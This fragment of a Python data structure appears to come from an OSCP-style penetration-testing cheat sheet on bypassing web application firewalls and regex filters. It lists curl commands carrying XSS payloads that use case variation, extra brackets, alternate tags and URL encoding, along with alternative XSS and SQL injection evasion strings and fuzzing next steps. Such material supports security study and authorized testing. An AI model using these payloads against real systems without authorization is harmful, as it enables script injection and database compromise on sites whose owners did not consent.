                        'command': f'# Case variation:\ncurl "{base_url}/?xss=<sCrIpT>alert(1)</sCriPt>"\n\n# Extra characters:\ncurl "{base_url}/?xss=<<script>alert(1)</script>"\n\n# Tag alternatives:\ncurl "{base_url}/?xss=<img/src=1/onerror=alert(0)>"\n\n# Encoding:\ncurl "{base_url}/?xss=<iframe%20src%3djavascript:alert(1)>"',
                        'flag_explanations': {
                            '<sCrIpT>': 'Case variation bypass (if regex case-sensitive)',
                            '<<script>': 'Double open bracket (parser confusion)',
                            '<img/src=1/onerror=alert(0)>': 'Slash instead of space',
                            '%20, %0a, %09': 'Space, newline, tab URL-encoded',
                            'backticks': 'alert`1` instead of alert(1)'
                        },
                        'success_indicators': [
                            'WAF allows payload',
                            'XSS/SQLi executes in browser/database',
                            'Regex filter bypassed',
                            'Payload reaches backend'
                        ],
                        'failure_indicators': [
                            'WAF blocks all attempts',
                            'Regex properly anchored and comprehensive',
                            'Normalization before check',
                            'Payload sanitized'
                        ],
                        'next_steps': [
                            'Combine techniques: case + encoding + extra chars',
                            'Test all payload categories: XSS, SQLi, command injection',
                            'Use PayloadsAllTheThings wordlists',
                            'Automated fuzzing: Burp Intruder, wfuzz',
                            'Context-aware bypass: HTML vs JS vs SQL'
                        ],
                        'alternatives': [
                            'Case: <ScRiPt>, <SCRIPT>, <script>',
                            'Tags: <svg/onload>, <marquee/onstart>, <details/open>',
                            'Encoding: java%0ascript:, &#x6A;avascript:',
                            'Uncommon functions: Function("ale"+"rt")(1)',
                            'SQL comments: UNION/**/SELECT, SEL/**/ECT',
                            'PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings',
                            'OWASP XSS Filter Evasion: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html'
                        ],
                        'tags': ['OSCP:HIGH', 'WAF_BYPASS', 'REGEX', 'XSS', 'SQLI'],
                        'estimated_time': '15-30 minutes',
                        'notes': 'PayloadsAllTheThings and OWASP cheat sheets essential. Test systematically: case, spacing, encoding, tags, functions. Many WAFs use signatures, not regex. Try mixed techniques. Use Burp Intruder for automation. Document what works for each WAF.'
                    }
                }
            ]
        }
